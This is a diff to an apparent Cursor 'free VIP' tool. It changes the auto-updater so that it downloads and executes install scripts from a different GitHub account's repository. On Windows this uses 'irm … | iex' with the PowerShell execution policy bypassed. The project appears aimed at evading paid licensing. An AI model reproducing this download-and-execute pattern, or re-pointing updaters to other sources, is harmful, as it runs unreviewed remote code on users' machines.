@@ -492,11 +492,11 @@ def check_latest_version():
             try:
                 # Execute update command based on platform
                 if platform.system() == 'Windows':
-                    update_command = 'irm https://raw.githubusercontent.com/hovanhoa/cursor-free-vip/main/scripts/install.ps1 | iex'
+                    update_command = 'irm https://raw.githubusercontent.com/vt57299/cursor-free-vip/main/scripts/install.ps1 | iex'
                     subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', update_command], check=True)
                 else:
                     # For Linux/Mac, download and execute the install script
-                    install_script_url = 'https://raw.githubusercontent.com/hovanhoa/cursor-free-vip/main/scripts/install.sh'
+                    install_script_url = 'https://raw.githubusercontent.com/vt57299/cursor-free-vip/main/scripts/install.sh'
                     
                     # First verify the script exists
                     script_response = requests.get(install_script_url, timeout=5)
